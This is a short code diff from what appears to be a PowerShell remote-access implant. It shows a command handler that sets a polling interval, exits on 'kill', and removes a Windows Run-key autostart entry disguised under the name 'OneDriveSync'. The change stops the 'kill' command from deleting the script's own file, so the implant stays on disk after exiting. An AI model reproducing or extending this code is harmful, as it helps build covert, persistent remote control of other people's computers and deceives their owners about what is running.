@@ -363,7 +363,7 @@ function Run-Cmd($c){
       Post "`[+] poll set to $($script:P) ms"
     }
     elseif($c -eq 'kill'){
-      Post '`[+] killed`'; Remove-Item $S -Force -EA 0; exit
+      Post '`[+] killed`'; exit
     }
     elseif($c -eq 'uninstall'){
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
